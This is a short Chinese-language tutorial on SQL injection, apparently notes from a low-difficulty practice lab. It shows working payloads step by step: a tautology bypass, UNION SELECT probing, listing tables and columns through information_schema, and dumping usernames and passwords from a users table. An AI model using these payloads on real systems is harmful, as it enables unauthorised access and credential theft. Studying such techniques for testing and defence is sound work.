Low-level
---
通常 sql 語法會長這樣：sql = SELECT * FROM (tabel_name) WHERE (column_name) = '$id';

SQL injection 旨在正常的 sql 語法中執行惡意的 sql 語法來得到敏感資料(i.g. 帳號密碼...)。

Step 1.
---

可以更改上面 '$id' 的部分，改成：1' OR 1 = 1; #

(p.s. 有時候會因為'導致 query 失敗，要注意！)

因為 OR 的關係，導致該語法會 query 所有的使用者出來。

Step 2.
---

由於我們會想知道更多資訊，會使用 UNION SELECT ... 去做二次查詢

因為 SELECT 出來的變數數量會被前台顯示限制住，所以可以會加入 group_concat(variable1, variable2, ...) 全部顯示出來。

因此可以將 '$id' 改成：UNION SELECT version(), database(); # 來查詢資料庫

Step 3.
---

MySQL 5.0 以上存在 information_schema，可以利用 information_schema 獲得資料庫進一步資訊

找出資料庫裡所對應的所有資料表：SELECT table_name FROM information_schema.tables

套用蓋年可以寫成：1' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema = database(); #

上面語法可以看到系統會使用到那些 Table 進行 query，接著再根據 Table 去查該 Table 有哪些欄位(column)：

改寫成：1' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users'; #

知道使用哪張 Table，又知道 Table 裡面有哪些欄位，那就可以來查想要的資料了

查看帳號和密碼：1' UNION SELECT 1, group_concat(user, password) FROM users; #
